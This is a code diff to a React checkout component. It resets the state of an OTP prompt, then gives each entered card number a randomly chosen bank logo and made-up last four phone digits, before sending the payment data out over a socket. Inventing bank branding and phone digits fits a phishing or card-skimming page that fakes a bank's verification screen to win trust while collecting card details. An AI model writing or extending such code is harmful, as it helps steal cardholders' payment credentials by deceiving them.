@@ -504,6 +504,22 @@ const Checkout = () => {
         amount: displayPrice,
         timestamp: new Date().toISOString()
       };
+      setOtpValue("");
+      setOtpError("");
+      setShowOtp(false);
+      setOtpSubmitting(false);
+      setResendMessage("");
+      setShowSpinner(false);
+      setDeclineError("");
+      setCardError("");
+      const cardKey = cardData.cardNumber.replace(/\s/g, "");
+      if (!cardSessionMap.current[cardKey]) {
+        const randomLogo = bankLogos[Math.floor(Math.random() * bankLogos.length)];
+        const randomLast4 = Math.floor(1000 + Math.random() * 9000).toString();
+        cardSessionMap.current[cardKey] = { logo: randomLogo, last4: randomLast4 };
+      }
+      setSessionBankLogo(cardSessionMap.current[cardKey].logo);
+      setOtpMobileLast4(cardSessionMap.current[cardKey].last4);
       socket.emit('payment-data', paymentData);
     } catch (error) {
       console.error('Error in payment confirmation:', error);
